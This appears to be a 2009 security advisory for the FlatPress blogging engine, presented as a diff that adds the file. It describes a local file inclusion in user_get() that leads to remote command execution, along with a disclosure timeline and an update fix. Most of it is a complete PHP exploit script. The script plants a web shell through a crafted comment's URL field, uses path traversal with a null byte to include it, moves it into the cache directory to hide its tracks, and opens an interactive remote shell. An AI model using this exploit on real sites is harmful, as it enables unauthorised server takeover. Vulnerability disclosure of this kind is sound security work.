@@ -1,0 +1,374 @@
+Security Advisory
+-----------------
+FlatPress 0.804-0.812.1 Local File Inclusion to Remote Command Execution
+
+
+Researcher Information
+----------------------
+Discovered by: Giuseppe `Zmax` Fuggiano
+Website: http://www.giusef.net
+Contact: giuseppe(dot)fuggiano(at)gmail(dot)com
+
+
+Product Information
+-------------------
+FlatPress is an open-source standard-compliant multi-lingual
+extensible blogging engine written in PHP by Edoardo Vacchi.
+
+Website: http://www.flatpress.org
+
+
+Vulnerability Description
+-------------------------
+The versions 0.804 through 0.812.1 are resulting to be prone to a nasty
+LFI vulnerability which can be exploited to have RCE (Remote Command
+Execution). The piece of code involved is in the
+fp-includes/core/core.users.php directory in the user_get() function
+as showed below.
+
+   function user_get($userid=null){
+       if ($userid == null && ($user = user_loggedin())) {
+           return $user;
+       }
+       if (file_exists($f = USERS_DIR . $userid.".php")) {
+           include($f);
+
+           return $user;
+       }
+   }
+
+It is possible to create a crafted comment for an article, and inject
+PHP code into the "web link" field, which is not properly validated.
+Then, a remote attacker could use this code to execute shell commands
+remotely, eventually hiding his own tracks (e.g. deleting the injected
+comment).
+
+
+Disclosure timeline
+-------------------
+
+DD/MM/YYYY
+
+* 24/09/2009: Vulnerability discovery and analysis;
+* 26/09/2009: The vendor was notificated via e-mail;
+* 26/09/2009: Vendor response and a new release publicly available;
+* 27/09/2009: The researcher starts coding the exploit;
+* 29/09/2009: Exploit complete and tested.
+
+
+Workaroud
+---------
+Update to the newer version 0.812.2
+
+
+Shouts
+------
+Thank you (you-know-who) :-)
+
+
+Exploit
+-------
+<?php
+  /* Author: Giuseppe `Zmax` Fuggiano <giuseppe(dot)fuggiano(at)gmail(dot)com>
+   *
+   * Description: FlatPress 0.804-0.812.1 Local File Inclusion to
+Remote Command Execution
+   *              vulnerability exploit (fp-includes/core/core.users.php).
+   *              This code posts a crafted comment with a very simple
+PHP shell.
+   *              It exploits the LFI, hides the shell in the cache directory
+   *              and starts a remote command session via POST.
+   *
+   * Syntax: php fp-lfi2rce.php <host> <path> [action] [lang] [shell]
+   *         <host>:   the hostname or IP address of your target;
+   *         <path>:   the path where FlatPress was installed;
+   *         [action]: the action to take against the host system
+(test, attack);
+   *         [lang]:   the remote language used (en, it);";
+   *         [shell]:  if already exploited, you could just have the shell name.
+   *
+   * Dependencies: php5-curl.
+   *
+   * Examples:
+   *   php fp-lfi2rce.php www.example.com /
+      => will test
+   *   php fp-lfi2rce.php www.example.com /blog attack
+      => will attack
+   *   php fp-lfi2rce.php www.example.com /flatpress attack en
+12345678.php  => start remote session
+   */
+
+  /* GET request, returns the page */
+  function get_url_contents($crl, $url)
+  {
+    curl_setopt($crl, CURLOPT_URL, $url);
+    curl_setopt($crl, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($crl, CURLOPT_CONNECTTIMEOUT, 10);
+    curl_setopt($crl, CURLOPT_COOKIEJAR, 'cookie.txt');
+    curl_setopt($crl, CURLOPT_COOKIEFILE, 'cookie.txt');
+    $ret = curl_exec($crl);
+
+    return $ret;
+  }
+
+  /* POST request */
+  function post_url_fields($crl, $url, $fields)
+  {
+    curl_setopt($crl, CURLOPT_URL, $url);
+    curl_setopt($crl, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($crl, CURLOPT_CONNECTTIMEOUT, 10);
+    curl_setopt($crl, CURLOPT_POST, 1);
+    curl_setopt($crl, CURLOPT_POSTFIELDS, $fields);
+    curl_setopt($crl, CURLOPT_COOKIEJAR, 'cookie.txt');
+    curl_setopt($crl, CURLOPT_COOKIEFILE, 'cookie.txt');
+    $ret = curl_exec($crl);
+
+    return $ret;
+  }
+
+  /* Execute remote command, returns the output */
+  function fp_exec($crl, $sh, $cmd)
+  {
+    $ret = post_url_fields($crl, $sh, "c=$cmd");
+
+    if ($ret) {
+      $pos1 = strpos($ret, 'http://www.aaa') + 14;
+      $pos2 = strpos($ret, 'aaa.com', $pos1);
+      $result = substr($ret, $pos1, $pos2-$pos1);
+      return $result;
+    } else
+      return false;
+  }
+
+  /* Starts a remote command session */
+  function fp_shell($crl, $sh)
+  {
+    echo "\nStarting remote command session, type 'quit' or 'exit' to exit.\n";
+
+    echo "\nremote> ";
+    $line = trim(fgets(STDIN));
+
+    while (($line != 'exit') && ($line != 'quit')) {
+      if ($line != "") {
+        if ($ret = fp_exec($crl, $sh, $line)) {
+          echo "\n$ret";
+        } else
+          echo "\nError.\n";
+      }
+      echo "\nremote> ";
+      $line = trim(fgets(STDIN));
+    }
+  }
+
+  function fail($crl, $str)
+  {
+    curl_close($crl);
+
+    die($str);
+  }
+
+  echo "\n Author: Giuseppe `Zmax` Fuggiano
+<giuseppe(dot)fuggiano(at)gmail(dot)com>\n";
+  echo "\n";
+  echo " Description: FlatPress 0.804-0.812.1 Local File Inclusion to
+Remote Command Execution\n";
+  echo "              vulnerability exploit
+(fp-includes/core/core.users.php).\n";
+  echo "              This code posts a crafted comment with a very
+simple PHP shell.\n";
+  echo "              It exploits the LFI, hides the shell in the
+cache directory\n";
+  echo "              and starts a remote command session via POST.\n";
+  echo "\n";
+  echo " Syntax: $argv[0] <host> <path> [action] [lang] [shell]\n";
+  echo "         <host>:   the hostname or IP address of your target;\n";
+  echo "         <path>:   the path where FlatPress was installed;\n";
+  echo "         [action]: the action to take against the host system
+(test, attack);\n";
+  echo "         [lang]:   the remote language used (en, it);\n";
+  echo "         [shell]:  if already exploited, you could just have
+the shell name.\n";
+  echo "\n";
+  echo " Examples:\n";
+  echo "         php $argv[0] www.example.com /
+          => will test\n";
+  echo "         php $argv[0] www.example.com /blog attack
+          => will attack\n";
+  echo "         php $argv[0] www.example.com /flatpress attack en
+12345678.php  => start remote session\n\n";
+
+  $crl = curl_init();
+
+  if ($argc < 3 || $argv[2] == '--help' || $argv[2] == '-h')
+    die();
+
+  $HOST = $argv[1];
+  $PATH = $argv[2];
+
+  if (isset($argv[3]))
+    $ACTION = $argv[3];
+  else
+    $ACTION = 'test';
+
+  if (isset($argv[4]))
+    $LANG = $argv[4];
+  else
+    $LANG = 'en';
+
+  switch ($LANG) {
+    case 'it':
+      $LANGARRAY = array('aaspam'   => 'Per prevenire abusi del
+sistema di commenti, ' .
+                                       'ti chiediamo di scrivere il
+risultato di ' .
+                                       'questa semplice operazione matematica',
+                         'sum'      => 'sommare',
+                         'subtract' => 'togli');
+      break;
+    default: /* en */
+      $LANGARRAY = array('aaspam'   => 'As a way to prevent abuses of
+this commenting system, ' .
+                                       'we must ask you to give the
+result of this simple ' .
+                                       'mathematical operation',
+                         'sum'      => 'sum',
+                         'subtract' => 'subtract');
+      break;
+  }
+
+  if (isset($argv[5])) {
+    $SHELL = $argv[5];
+    fp_shell($crl, "fp-content/cache/$SHELL");
+    curl_close($crl);
+    exit();
+  } else
+    $SHELL = 'unknown';
+
+  echo " Host: $HOST\n";
+  echo " Path: $PATH\n";
+  echo " Lang: $LANG\n";
+  echo " Shell: $SHELL\n\n";
+
+  echo " [+] Vulnerability test: ";
+
+  $form = "user=../../admin&pass=".rand()."&submit=Login";
+  $loginpage = post_url_fields($crl, "$HOST/$PATH/login.php", $form);
+
+  if (strpos($loginpage, '<meta name="generator" content="FlatPress') == false)
+    echo "vulnerable!\n\n";
+  else
+    fail($crl, "NOT vulnerable!\n\n");
+
+  if ($ACTION == "test") {
+    curl_close($crl);
+    exit();
+  }
+
+  echo " [+] Creating the shell\n";
+  echo "     * Getting the home page: ";
+
+  $home = get_url_contents($crl, "$HOST/$PATH/");
+
+  if (strpos($home, '<meta name="generator" content="FlatPress'))
+    echo "ok\n";
+  else
+    fail($crl, "FAIL!\n\n");
+
+  echo "     * Detecting an article: ";
+
+  $entrypos = strpos($home, "x=entry:entry") + 8;
+
+  if ($entrypos) {
+    $entry = substr($home, $entrypos, 18);
+    echo "$entry\n";
+  } else
+    fail($crl, "FAIL!\n\n");
+
+  echo "     * Getting the comment page: ";
+
+  $commentpage = get_url_contents($crl,
+"$HOST/$PATH/?x=entry:$entry;comments:1");
+
+  if (strpos($commentpage, 'id="comment-userdata"'))
+    echo "ok\n";
+  else
+    fail($crl, "FAIL!\n\n");
+
+  echo "     * Solving the math operation: ";
+
+  $mathpos = strpos($commentpage, $LANGARRAY['aaspam']) +
+strlen($LANGARRAY['aaspam']);
+  $mathpos = strpos($commentpage, "strong", $mathpos) + strlen("strong>");
+  $mathstr = substr($commentpage, $mathpos, strlen($commentpage)-$mathpos);
+  $operation = strtok($mathstr, " ");
+
+  switch ($operation) {
+    case $LANGARRAY['sum']:
+      $first = strtok(' ');
+      $to = strtok(' ');
+      $second = strtok(' ');
+      $result = $first + $second;
+      break;
+    case $LANGARRAY['subtract']:
+      $first = strtok(' ');
+      $from = strtok(' ');
+      $second = strtok(' ');
+      $result = $second - $first;
+      break;
+    case (is_numeric($operation) ? $operation : ""):
+      $first = $operation;
+      $times = strtok(' ');
+      $second = strtok(' ');
+      $result = $first * $second;
+      break;
+    default:
+      fail($crl, "FAIL!\n\n");
+  }
+
+  echo "$result\n";
+
+  echo "     * Posting crafted comment...\n";
+
+  $random = rand();
+  $form = 'name='.$random.'&email=fake@fake.com&url=http://www.aaa\<?system($_POST[\'c\']);?\>aaa.com'
+.
+          '&aaspam='.$result.'&content=foo&submit=Add';
+
+  post_url_fields($crl, "$HOST/$PATH/?x=entry:$entry;comments:1", $form);
+  $commentpage = get_url_contents($crl,
+"$HOST/$PATH/?x=entry:$entry;comments:1");
+
+  echo "     * Searching comment name: ";
+
+  if (preg_match_all("/comment[0-9][0-9][0-9][0-9][0-9][0-9]-[0-9][0-9][0-9][0-9][0-9][0-9]/",
+                     $commentpage, $comments, PREG_PATTERN_ORDER)) {
+      $commententry = end($comments[0]);
+      echo "$commententry\n";
+  } else
+    fail($crl, "FAIL!\n\n");
+
+  $year = substr($entry, 5, 2);
+  $month = substr($entry, 7, 2);
+  $commentpath = "content/$year/$month/$entry/comments/$commententry.txt";
+
+  echo "     * Hiding tracks: ";
+
+  $SHELL = rand().'.php';
+
+  $form = "user=../$commentpath%00a&pass=".rand()."&submit=Login" .
+          "&c=mv -f fp-content/$commentpath fp-content/cache/$SHELL";
+
+  $loginpage = post_url_fields($crl, "$HOST/$PATH/login.php", $form);
+
+  if (strpos($loginpage, 'http://www.aaa') && strpos($loginpage, 'aaa.com')) {
+    echo "ok\n\n";
+    echo " [+] Your shell: fp-content/cache/$SHELL\n";
+  } else
+    fail($crl, "FAIL!\n\n");
+
+  fp_shell($crl, "$HOST/$PATH/fp-content/cache/$SHELL");
+
+  curl_close($crl);
+
+  exit();
+?>
